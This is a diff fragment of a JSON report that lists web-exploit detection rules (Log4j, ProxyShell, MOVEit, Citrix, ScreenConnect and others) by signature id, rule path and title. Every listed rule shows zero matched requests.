+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-20090/web_cve_2021_20090_2021_20091_arcadyan_router_exploit.yml",
+   "title": "Arcadyan Router Exploitations",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2021-20090-2021-20091-arcadyan-2",
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-20090/web_cve_2021_20090_2021_20091_arcadyan_router_exploit.yml",
+   "title": "Arcadyan Router Exploitations",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2021-2109-weblogic-rce-exploit",
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-2109/web_cve_2021_2109_weblogic_rce_exploit.yml",
+   "title": "Oracle WebLogic Exploit CVE-2021-2109",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2021-21972-vsphere-unauth-rce",
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-21972/web_cve_2021_21972_vsphere_unauth_rce_exploit.yml",
+   "title": "CVE-2021-21972 VSphere Exploitation",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2021-21978-vmware-view-planner",
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-21978/web_cve_2021_21978_vmware_view_planner_exploit.yml",
+   "title": "CVE-2021-21978 Exploitation Attempt",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2021-22005-vmware-file-upload",
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-22005/web_cve_2021_22005_vmware_file_upload.yml",
+   "title": "VMware vCenter Server File Upload CVE-2021-22005",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2021-22123-fortinet-exploit",
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-22123/web_cve_2021_22123_fortinet_exploit.yml",
+   "title": "Fortinet CVE-2021-22123 Exploitation",
+   "pure": false,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2021-22893-pulse-secure-rce",
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-22893/web_cve_2021_22893_pulse_secure_rce_exploit.yml",
+   "title": "Pulse Connect Secure RCE Attack CVE-2021-22893",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2021-26814-wzuh-rce",
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-26814/web_cve_2021_26814_wzuh_rce.yml",
+   "title": "Exploitation of CVE-2021-26814 in Wazuh",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2021-26858-iis-rce",
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-26858/web_cve_2021_26858_iis_rce.yml",
+   "title": "ProxyLogon Reset Virtual Directories Based On IIS Log",
+   "pure": false,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2021-27905-apache-solr-exploit-1",
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-27905/web_cve_2021_27905_apache_solr_exploit.yml",
+   "title": "Potential CVE-2021-27905 Exploitation Attempt",
+   "pure": true,
+   "statuses": [
+    200
+   ],
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2021-27905-apache-solr-exploit-2",
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-27905/web_cve_2021_27905_apache_solr_exploit.yml",
+   "title": "Potential CVE-2021-27905 Exploitation Attempt",
+   "pure": true,
+   "statuses": [
+    200
+   ],
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2021-28480-exchange-exploit",
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-28480/web_cve_2021_28480_exchange_exploit.yml",
+   "title": "Exchange Exploitation CVE-2021-28480",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2021-33766-msexchange-1",
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-33766/web_cve_2021_33766_msexchange_proxytoken.yml",
+   "title": "CVE-2021-33766 Exchange ProxyToken Exploitation",
+   "pure": true,
+   "statuses": [
+    500
+   ],
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2021-33766-msexchange-2",
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-33766/web_cve_2021_33766_msexchange_proxytoken.yml",
+   "title": "CVE-2021-33766 Exchange ProxyToken Exploitation",
+   "pure": true,
+   "statuses": [
+    500
+   ],
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2021-40539-adselfservice",
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-40539/web_cve_2021_40539_adselfservice.yml",
+   "title": "ADSelfService Exploitation",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2021-40539-manageengine",
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-40539/web_cve_2021_40539_manageengine_adselfservice_exploit.yml",
+   "title": "CVE-2021-40539 Zoho ManageEngine ADSelfService Plus Exploit",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2021-41773-apache-path-traversal",
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-41773/web_cve_2021_41773_apache_path_traversal.yml",
+   "title": "CVE-2021-41773 Exploitation Attempt",
+   "pure": true,
+   "statuses": [
+    200,
+    301
+   ],
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2021-42237-sitecore-report-ashx",
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-42237/web_cve_2021_42237_sitecore_report_ashx.yml",
+   "title": "Sitecore Pre-Auth RCE CVE-2021-42237",
+   "pure": true,
+   "statuses": [
+    200
+   ],
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2021-43798-grafana",
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-43798/web_cve_2021_43798_grafana.yml",
+   "title": "Grafana Path Traversal Exploitation CVE-2021-43798",
+   "pure": true,
+   "statuses": [
+    200
+   ],
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2021-44228-log4j",
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-44228/web_cve_2021_44228_log4j.yml",
+   "title": "Log4j RCE CVE-2021-44228 Generic",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2021-44228-log4j-fields",
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-44228/web_cve_2021_44228_log4j_fields.yml",
+   "title": "Log4j RCE CVE-2021-44228 in Fields",
+   "pure": false,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-exchange-proxyshell-1",
+   "path": "rules-emerging-threats/2021/Exploits/ProxyShell-Exploit/web_exchange_proxyshell.yml",
+   "title": "Exchange ProxyShell Pattern",
+   "pure": true,
+   "statuses": [
+    401
+   ],
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-exchange-proxyshell-2",
+   "path": "rules-emerging-threats/2021/Exploits/ProxyShell-Exploit/web_exchange_proxyshell.yml",
+   "title": "Exchange ProxyShell Pattern",
+   "pure": true,
+   "statuses": [
+    401
+   ],
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-exchange-proxyshell-successful",
+   "path": "rules-emerging-threats/2021/Exploits/ProxyShell-Exploit/web_exchange_proxyshell_successful.yml",
+   "title": "Successful Exchange ProxyShell Attack",
+   "pure": true,
+   "statuses": [
+    200,
+    301
+   ],
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-exchange-exploitation-hafnium-1",
+   "path": "rules-emerging-threats/2021/TA/HAFNIUM/web_exchange_exploitation_hafnium.yml",
+   "title": "Exchange Exploitation Used by HAFNIUM",
+   "pure": false,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-exchange-exploitation-hafnium-2",
+   "path": "rules-emerging-threats/2021/TA/HAFNIUM/web_exchange_exploitation_hafnium.yml",
+   "title": "Exchange Exploitation Used by HAFNIUM",
+   "pure": false,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-exchange-exploitation-hafnium-3",
+   "path": "rules-emerging-threats/2021/TA/HAFNIUM/web_exchange_exploitation_hafnium.yml",
+   "title": "Exchange Exploitation Used by HAFNIUM",
+   "pure": false,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-unc2546-dewmode-php-webshell-1",
+   "path": "rules-emerging-threats/2021/TA/UNC2546/web_unc2546_dewmode_php_webshell.yml",
+   "title": "DEWMODE Webshell Access",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-unc2546-dewmode-php-webshell-2",
+   "path": "rules-emerging-threats/2021/TA/UNC2546/web_unc2546_dewmode_php_webshell.yml",
+   "title": "DEWMODE Webshell Access",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2022-21587-oracle-ebs",
+   "path": "rules-emerging-threats/2022/Exploits/CVE-2022-21587/web_cve_2022_21587_oracle_ebs.yml",
+   "title": "Potential CVE-2022-21587 Exploitation Attempt",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2022-27925-exploit",
+   "path": "rules-emerging-threats/2022/Exploits/CVE-2022-27925/web_cve_2022_27925_exploit.yml",
+   "title": "Zimbra Collaboration Suite Email Server Unauthenticated RCE",
+   "pure": true,
+   "statuses": [
+    200,
+    401
+   ],
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2022-31656-auth-bypass",
+   "path": "rules-emerging-threats/2022/Exploits/CVE-2022-31656/web_cve_2022_31656_auth_bypass.yml",
+   "title": "CVE-2022-31656 VMware Workspace ONE Access Auth Bypass",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2022-31659-vmware-rce",
+   "path": "rules-emerging-threats/2022/Exploits/CVE-2022-31659/web_cve_2022_31659_vmware_rce.yml",
+   "title": "CVE-2022-31659 VMware Workspace ONE Access RCE",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2022-33891-spark-shell-command",
+   "path": "rules-emerging-threats/2022/Exploits/CVE-2022-33891/web_cve_2022_33891_spark_shell_command_injection.yml",
+   "title": "Apache Spark Shell Command Injection - Weblogs",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2022-36804-atlassian-bitbucket",
+   "path": "rules-emerging-threats/2022/Exploits/CVE-2022-36804/web_cve_2022_36804_atlassian_bitbucket_command_injection.yml",
+   "title": "Atlassian Bitbucket Command Injection Via Archive API",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2022-36804-exchange-owassrf",
+   "path": "rules-emerging-threats/2022/Exploits/CVE-2022-41082/web_cve_2022_36804_exchange_owassrf_exploitation.yml",
+   "title": "Potential OWASSRF Exploitation Attempt - Webserver",
+   "pure": false,
+   "statuses": [
+    200
+   ],
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2022-44877-exploitation-attempt",
+   "path": "rules-emerging-threats/2022/Exploits/CVE-2022-44877/web_cve_2022_44877_exploitation_attempt.yml",
+   "title": "Potential Centos Web Panel Exploitation Attempt - CVE-2022-44877",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2022-46169-cacti-exploitation",
+   "path": "rules-emerging-threats/2022/Exploits/CVE-2022-46169/web_cve_2022_46169_cacti_exploitation_attempt.yml",
+   "title": "Potential CVE-2022-46169 Exploitation Attempt",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-exploit-cve-2023-22518-confluence",
+   "path": "rules-emerging-threats/2023/Exploits/CVE-2023-22518/web_exploit_cve_2023_22518_confluence_auth_bypass.yml",
+   "title": "CVE-2023-22518 Exploitation Attempt - Vulnerable Endpoint Connection (Webserver)",
+   "pure": true,
+   "statuses": [
+    200,
+    302,
+    405
+   ],
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2023-23752-joomla-exploit-attempt",
+   "path": "rules-emerging-threats/2023/Exploits/CVE-2023-23752/web_cve_2023_23752_joomla_exploit_attempt.yml",
+   "title": "Potential CVE-2023-23752 Exploitation Attempt",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2023-25157-geoserver-sql",
+   "path": "rules-emerging-threats/2023/Exploits/CVE-2023-25157/web_cve_2023_25157_geoserver_sql_injection.yml",
+   "title": "Potential CVE-2023-25157 Exploitation Attempt",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2023-25717-ruckus-wireless-admin",
+   "path": "rules-emerging-threats/2023/Exploits/CVE-2023-25717/web_cve_2023_25717_ruckus_wireless_admin_exploit_attempt.yml",
+   "title": "Potential CVE-2023-25717 Exploitation Attempt",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2023-27997-pre-authentication-rce",
+   "path": "rules-emerging-threats/2023/Exploits/CVE-2023-27997/web_cve_2023_27997_pre_authentication_rce.yml",
+   "title": "Potential CVE-2023-27997 Exploitation Indicators",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2023-34362-known-payload-request",
+   "path": "rules-emerging-threats/2023/Exploits/CVE-2023-34362-MOVEit-Transfer-Exploit/web_cve_2023_34362_known_payload_request.yml.yml",
+   "title": "MOVEit CVE-2023-34362 Exploitation Attempt - Potential Web Shell Request",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-exploit-cve-2023-43261-milesight",
+   "path": "rules-emerging-threats/2023/Exploits/CVE-2023-43261/web_exploit_cve_2023_43261_milesight_information_disclosure.yml",
+   "title": "Potential Information Disclosure CVE-2023-43261 Exploitation - Web",
+   "pure": true,
+   "statuses": [
+    200
+   ],
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2023-46214-rce-splunk-enterprise",
+   "path": "rules-emerging-threats/2023/Exploits/CVE-2023-46214/web_cve_2023_46214_rce_splunk_enterprise.yml",
+   "title": "Potential CVE-2023-46214 Exploitation Attempt",
+   "pure": true,
+   "statuses": [
+    200,
+    302
+   ],
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2023-46214-rce-splunk-1",
+   "path": "rules-emerging-threats/2023/Exploits/CVE-2023-46214/web_cve_2023_46214_rce_splunk_enterprise_poc.yml",
+   "title": "Exploitation Attempt Of CVE-2023-46214 Using Public POC Code",
+   "pure": true,
+   "statuses": [
+    200,
+    302
+   ],
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2023-46214-rce-splunk-2",
+   "path": "rules-emerging-threats/2023/Exploits/CVE-2023-46214/web_cve_2023_46214_rce_splunk_enterprise_poc.yml",
+   "title": "Exploitation Attempt Of CVE-2023-46214 Using Public POC Code",
+   "pure": true,
+   "statuses": [
+    200,
+    302
+   ],
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2023-46747-f5-remote-code-1",
+   "path": "rules-emerging-threats/2023/Exploits/CVE-2023-46747/web_cve_2023_46747_f5_remote_code_execution.yml",
+   "title": "CVE-2023-46747 Exploitation Activity - Webserver",
+   "pure": false,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-cve-2023-46747-f5-remote-code-2",
+   "path": "rules-emerging-threats/2023/Exploits/CVE-2023-46747/web_cve_2023_46747_f5_remote_code_execution.yml",
+   "title": "CVE-2023-46747 Exploitation Activity - Webserver",
+   "pure": false,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-exploit-cve-2023-4966-citrix",
+   "path": "rules-emerging-threats/2023/Exploits/CVE-2023-4966/web_exploit_cve_2023_4966_citrix_sensitive_information_disclosure_exploit.yml",
+   "title": "CVE-2023-4966 Potential Exploitation Attempt - Citrix ADC Sensitive Information Disclosure - Webserver",
+   "pure": true,
+   "statuses": [
+    200
+   ],
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-exploit-cve-2024-1212",
+   "path": "rules-emerging-threats/2024/Exploits/CVE-2024-1212/web_exploit_cve_2024_1212_.yml",
+   "title": "CVE-2024-1212 Exploitation - Progress Kemp LoadMaster Unauthenticated Command Injection",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
+   "signature": "sg-exploit-cve-2024-1709-screenconnect",
+   "path": "rules-emerging-threats/2024/Exploits/CVE-2024-1709/web_exploit_cve_2024_1709_screenconnect.yml",
+   "title": "CVE-2024-1709 - ScreenConnect Authentication Bypass Exploitation",
+   "pure": true,
+   "statuses": null,
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_any": 0,
+   "status_excluded": 0,
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "urls": []
+  },
+  {
